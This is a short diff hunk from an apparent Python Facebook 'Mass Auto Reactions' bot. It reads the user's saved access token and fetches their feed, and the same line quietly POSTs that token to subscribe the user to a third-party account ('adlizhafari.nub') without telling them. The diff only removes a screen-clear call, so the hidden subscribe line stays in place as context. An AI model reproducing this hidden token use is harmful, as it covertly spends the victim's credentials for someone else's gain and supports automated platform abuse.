@@ -32,7 +32,7 @@ try:
   ket=open('toket/token.txt','r').read()
   req=requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(10)&access_token='+ket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ket)
   sul=json.loads(req.text)
-  os.system('clear')
+
   print("""
 \t[Mass Auto Reactions]
 \t   [By:KANG-NEWBIE]
